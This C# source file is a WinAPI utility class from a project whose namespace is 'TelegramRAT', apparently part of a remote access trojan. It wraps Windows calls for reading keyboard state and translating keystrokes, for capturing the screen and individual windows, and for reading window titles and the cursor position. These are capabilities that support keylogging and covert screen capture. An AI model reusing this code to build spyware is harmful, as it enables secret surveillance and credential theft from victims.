using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Drawing;
using System.Text;

namespace TelegramRAT.Utilities;

static class WinAPI
{
    const string u32 = "user32.dll";


    [DllImport(u32, EntryPoint = "MessageBox")]
    static extern int MessageBox(IntPtr ParentWindow, string Text, string Caption, uint Type);

    public static int ShowMessageBox(string Text, string Caption)
    {
        return MessageBox(GetForegroundWindow(), Text, Caption, (uint)MsgBoxFlag.MB_APPLMODAL);
    }

    public static async Task<int> ShowMessageBoxAsync(string Text, string Caption, MsgBoxFlag Flag)
    {
        int answer = await Task.Run<int>(() => MessageBox(GetForegroundWindow(), Text, Caption, (uint)MsgBoxFlag.MB_APPLMODAL | (uint)Flag));

        return answer;
    }

    public enum MsgBoxFlag : ulong
    {
        MB_APPLMODAL = 0x00000000L,
        MB_ICONINFORMATION = 0x00000040L,
        MB_ICONEXCLAMATION = 0x00000030L,
        MB_ICONQUESTION = 0x00000020L,
        MB_ICONSTOP = 0x00000010L,
        MB_YESNO = 0x00000004L
    }

    [DllImport(u32, EntryPoint = "GetSystemMetrics")]
    static extern int GetSystemMetrics(int index);

    enum MetricsIndexes : int
    {
        SM_CXSCREEN = 0,
        SM_CYSCREEN = 1,
        SM_CXFULLSCREEN = 16,
        SM_CYFULLSCREEN = 17,
        SM_XVIRTUALSCREEN = 76,
        SM_YVIRTUALSCREEN = 77,
        SM_CXVIRTUALSCREEN = 78,
        SM_CYVIRTUALSCREEN = 79
    }

    public static Rectangle GetScreenBounds()
    {
        int originX = GetSystemMetrics((int)MetricsIndexes.SM_XVIRTUALSCREEN);
        int originY = GetSystemMetrics((int)MetricsIndexes.SM_YVIRTUALSCREEN);
        int width = GetSystemMetrics((int)MetricsIndexes.SM_CXVIRTUALSCREEN);
        int height = GetSystemMetrics((int)MetricsIndexes.SM_CYVIRTUALSCREEN);

        return new Rectangle(originX, originY, width, height);
    }


    [DllImport("wininet.dll", EntryPoint = "InternetGetConnectedState")]
    static extern bool GetInternetConnection(IntPtr flags, int reserved = 0);

    public static bool CheckInternetConnection()
    {
        IntPtr ptr = IntPtr.Zero;

        GetInternetConnection(ptr);

        long a = ptr.ToInt64();

        if ((a & 0x20) != 0x20)
        {
            return true;
        }
        return false;
    }

    [DllImport(u32, EntryPoint = "FindWindowA")]
    public static extern IntPtr FindWindow(string ClassName, string Caption);

    [DllImport(u32, EntryPoint = "GetForegroundWindow")]
    public static extern IntPtr GetForegroundWindow();

    [DllImport(u32, CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

    public const int SPI_SETDESKWALLPAPER = 20;
    public const int SPIF_UPDATEINIFILE = 0x01;
    public const int SPIF_SENDWININICHANGE = 0x02;

    public const int WM_SYSCOMMAND = 0x0112;
    public const int SC_MINIMIZE = 0xF020;
    public const int SC_MAXIMIZE = 0xF030;
    public const int SC_RESTORE = 0xF120;
    public const int SC_CLOSE = 0xF060;

    [DllImport(u32, EntryPoint = "CloseWindow")]
    public static extern bool MinimizeWindow(IntPtr handle);

    [DllImport(u32, SetLastError = true)]
    public static extern int GetWindowThreadProcessId(IntPtr hWnd, out int processId);

    [DllImport(u32, EntryPoint = "GetAsyncKeyState")]
    public static extern short GetAsyncKeyState(uint key);

    [DllImport(u32, EntryPoint = "GetKeyboardState")]
    public static extern bool GetKeyboardState(byte[] keyState);

    [DllImport(u32, EntryPoint = "GetKeyState")]
    public static extern short GetKeyState(int virtualKeyCode);

    [DllImport(u32, EntryPoint = "MapVirtualKeyW")]
    public static extern uint MapVirtualKey(uint keyCode, uint mapType = 0);

    [DllImport(u32, EntryPoint = "ToUnicodeEx")]
    public static extern int ToUnicodeEx(
        uint virtualKey,
        uint scanCode,
        byte[] keyState,
        StringBuilder receivingBuffer,
        int bufferSize,
        uint flags,
        IntPtr inputLocaleHandle);

    [DllImport(u32, EntryPoint = "GetKeyboardLayout")]
    public static extern IntPtr GetKeyboardLayout(uint threadId);

    [DllImport(u32, EntryPoint = "PostMessageA")]
    public static extern bool PostMessage(IntPtr hWnd, int msg, int wParam, int lParam);


    [DllImport("user32.dll", EntryPoint = "SendMessage", CharSet = CharSet.Auto)]
    public static extern bool SendMessage(IntPtr hWnd, uint Msg, int wParam, StringBuilder lParam);

    [DllImport("user32.dll")]
    public static extern IntPtr SendMessage(int hWnd, int Msg, int wparam, int lparam);

    const int WM_GETTEXT = 0x000D;
    const int WM_GETTEXTLENGTH = 0x000E;

    public static string GetWindowTitle(IntPtr hWnd)
    {
        int titleSize = SendMessage((int)hWnd, WM_GETTEXTLENGTH, 0, 0).ToInt32();

        if (titleSize == 0)
            return String.Empty;

        StringBuilder title = new StringBuilder(titleSize + 1);

        SendMessage(hWnd, (int)WM_GETTEXT, title.Capacity, title);

        return title.ToString();
    }

    [DllImport(u32, EntryPoint = "PrintWindow")]
    public static extern bool PrintWindow(IntPtr hWnd, IntPtr hDcBlt, uint flags);

    [DllImport(u32, EntryPoint = "GetWindowRect")]

    static extern bool GetWindowRect(IntPtr hWnd, IntPtr Rect);
    [DllImport(u32, EntryPoint = "GetWindowRect")]
    static extern unsafe bool GetWindowRect(IntPtr hWnd, Rectangle* Rect);

    public static unsafe Rectangle GetWindowBounds(IntPtr hWnd)
    {
        Rectangle rect = new Rectangle();
        Rectangle* ptr = &rect;
        GetWindowRect(hWnd, ptr);
        rect.Width -= rect.X;
        rect.Height -= rect.Y;
        return rect;
    }

    public const int SC_MONITORPOWER = 0xF170;

    [DllImport(u32, EntryPoint = "IsWindow")]
    public static extern bool IsWindow(IntPtr hWnd);

    [DllImport("Oleacc.dll", EntryPoint = "GetProcessHandleFromHwnd")]
    public static extern IntPtr GetProcessHandleFromWindow(IntPtr hWnd);

    [DllImport("Kernel32.dll", EntryPoint = "GetProcessId")]
    public static extern int GetProcessId(IntPtr procHandle);

    [DllImport(u32, EntryPoint = "GetDC", SetLastError = true)]
    public static extern IntPtr GetDC(IntPtr hWnd);

    [DllImport(u32, EntryPoint = "ReleaseDC", SetLastError = true)]
    public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDc);

    [DllImport("Gdi32.dll", EntryPoint = "BitBlt")]
    public static extern bool BitBlt(
        IntPtr destHdc,
        int x,
        int y,
        int width,
        int height,
        IntPtr srcHdc,
        int x1,
        int y1,
        int rop);

    [DllImport(u32, EntryPoint = "GetCursorPos")]
    public static extern bool GetCursorPos(out Point pt);

    [DllImport(u32, EntryPoint = "GetClientRect", SetLastError = true)]
    public static extern bool GetClientRect(IntPtr hWnd, out Rectangle rect);

    public readonly struct KeyTranslationResult
    {
        public KeyTranslationResult(string text, string hexFallback, bool containsTranslatedCharacters, bool containsFallbackPlaceholders)
        {
            Text = text;
            HexFallback = hexFallback;
            ContainsTranslatedCharacters = containsTranslatedCharacters;
            ContainsFallbackPlaceholders = containsFallbackPlaceholders;
        }

        public string Text { get; }
        public string HexFallback { get; }
        public bool ContainsTranslatedCharacters { get; }
        public bool ContainsFallbackPlaceholders { get; }
    }

    public static KeyTranslationResult TranslateKeyCombination(IReadOnlyCollection<uint> keys)
    {
        if (keys == null || keys.Count == 0)
            return new KeyTranslationResult(string.Empty, string.Empty, containsTranslatedCharacters: false, containsFallbackPlaceholders: false);

        var keyboardState = new byte[256];
        if (!GetKeyboardState(keyboardState))
        {
            Array.Clear(keyboardState, 0, keyboardState.Length);
        }

        foreach (var key in keys)
        {
            if (key < keyboardState.Length)
            {
                keyboardState[key] |= 0x80;
                if (IsToggleKey(key) && (GetKeyState((int)key) & 0x1) != 0)
                {
                    keyboardState[key] |= 0x01;
                }
            }
        }

        var layout = GetCurrentKeyboardLayout();

        var mappedBuilder = new StringBuilder();
        var fallbackParts = new List<string>(keys.Count);
        var containsTranslatedCharacters = false;
        var containsFallbackPlaceholders = false;

        foreach (var key in keys)
        {
            fallbackParts.Add($"0x{key:X2}");

            if (IsModifierKey(key))
                continue;

            var translated = TranslateKey(key, keyboardState, layout);
            if (!string.IsNullOrEmpty(translated))
            {
                mappedBuilder.Append(translated);
                containsTranslatedCharacters = true;
            }
            else
            {
                mappedBuilder.Append($"[0x{key:X2}]");
                containsFallbackPlaceholders = true;
            }
        }

        return new KeyTranslationResult(
            mappedBuilder.ToString(),
            string.Join(" ", fallbackParts),
            containsTranslatedCharacters,
            containsFallbackPlaceholders);
    }

    static IntPtr GetCurrentKeyboardLayout()
    {
        var foregroundWindow = GetForegroundWindow();
        if (foregroundWindow != IntPtr.Zero)
        {
            var threadId = GetWindowThreadProcessId(foregroundWindow, out _);
            var layout = GetKeyboardLayout((uint)threadId);
            if (layout != IntPtr.Zero)
                return layout;
        }

        return GetKeyboardLayout(0);
    }

    static string TranslateKey(uint key, byte[] keyboardState, IntPtr layout)
    {
        var buffer = new StringBuilder(8);
        var scanCode = MapVirtualKey(key, 0);
        var result = ToUnicodeEx(key, scanCode, keyboardState, buffer, buffer.Capacity, 0, layout);

        if (result > 0)
        {
            return buffer.ToString(0, result);
        }

        if (result < 0)
        {
            ToUnicodeEx(key, scanCode, keyboardState, buffer, buffer.Capacity, 0, layout);
        }

        return string.Empty;
    }

    static bool IsModifierKey(uint key) => key switch
    {
        0x10 or 0x11 or 0x12 or 0x14 or 0x5B or 0x5C => true,
        0xA0 or 0xA1 or 0xA2 or 0xA3 or 0xA4 or 0xA5 => true,
        _ => false
    };

    static bool IsToggleKey(uint key) => key switch
    {
        0x14 or 0x90 or 0x91 => true,
        _ => false
    };
}

